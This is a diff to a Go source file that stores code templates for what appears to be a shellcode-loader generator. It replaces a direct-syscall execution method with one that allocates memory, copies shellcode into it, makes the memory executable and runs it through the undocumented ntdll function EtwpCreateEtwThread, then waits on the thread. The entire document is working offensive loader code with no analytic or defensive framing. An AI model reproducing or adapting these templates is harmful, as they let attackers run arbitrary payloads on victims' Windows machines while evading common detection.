@@ -1,30 +1,30 @@
 package local
 
-const goSyscallDlls = `
+const EtwpCreateETWThreadImports = `
+	"fmt"
+	"log"
+	
+	
+	"unsafe"
+
+	
+
+	// Sub Repositories
+
+	"golang.org/x/sys/windows"
+`
+const EtwpCreateETWThreadDlls = `
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	VirtualProtect := kernel32.NewProc("VirtualProtect")
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")
+	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
 `
 
-const goSyscallImports = `
-	"fmt"
-	"log"
-	"os"
-	"syscall"
-	"time"
-	"unsafe"
-
-	"github.com/salukikit/go-util/pkg/box"
-
-	// Sub Repositories
-
-	"golang.org/x/sys/windows"
-`
-
-const goSyscall = `
+const EtwpCreateETWThread = `
 	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
@@ -47,9 +47,15 @@ const goSyscall = `
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
 
-	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
+	//var lpThreadId uint32
+	thread, _, errEtwThread := EtwpCreateEtwThread.Call(addr, uintptr(0))
 
-	if errSyscall != 0 {
-		log.Fatal(fmt.Sprintf("[!]Error executing shellcode syscall:\r\n%s", errSyscall.Error()))
+	if errEtwThread != nil && errEtwThread.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling EtwpCreateEtwThread:\r\n%s", errEtwThread.Error()))
+	}
+
+	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
 	}
 `
